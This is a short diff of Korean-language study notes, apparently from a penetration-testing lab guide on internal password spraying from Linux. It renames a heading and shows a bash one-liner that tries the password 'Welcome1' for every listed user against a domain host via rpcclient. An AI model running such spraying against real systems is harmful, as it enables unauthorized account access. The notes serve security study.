@@ -99,7 +99,7 @@ rpcclient $> enumdomusers
 <br/><br/>
 ## 5. Internal Password Spraying - from Linux
 
-### Bash를 이용한 one-liner Attack
+### Bash를 이용한 one-liner Attack (rpcclient 사용)
 ```for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done```
 
 ### Kerbrute 사용
